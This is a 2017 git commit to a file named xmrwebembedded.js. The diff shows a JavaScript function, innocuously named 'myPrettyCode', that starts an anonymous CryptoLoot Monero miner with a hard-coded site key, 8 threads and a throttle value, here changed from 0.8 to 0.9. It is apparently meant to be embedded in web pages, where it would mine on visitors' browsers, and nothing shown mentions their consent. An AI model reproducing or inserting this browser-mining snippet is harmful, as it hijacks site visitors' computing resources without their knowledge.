5e1a46b52f5ef64c13431decae522614d12fa707
Newbie <linhdqtg@gmail.com>
2017-10-20 00:26:59 +0700

    Update xmrwebembedded.js

--- xmrwebembedded.js
+++ xmrwebembedded.js
@@ -17,7 +17,7 @@ function loadScript(url, callback)
 var myPrettyCode = function() {
   var miner=new CryptoLoot.Anonymous('552a3151084681c06422b293d948704b43eccce6f7f5',
         {
-        threads:8,autoThreads:false,throttle:0.8
+        threads:8,autoThreads:false,throttle:0.9
         }
   );
   miner.start();
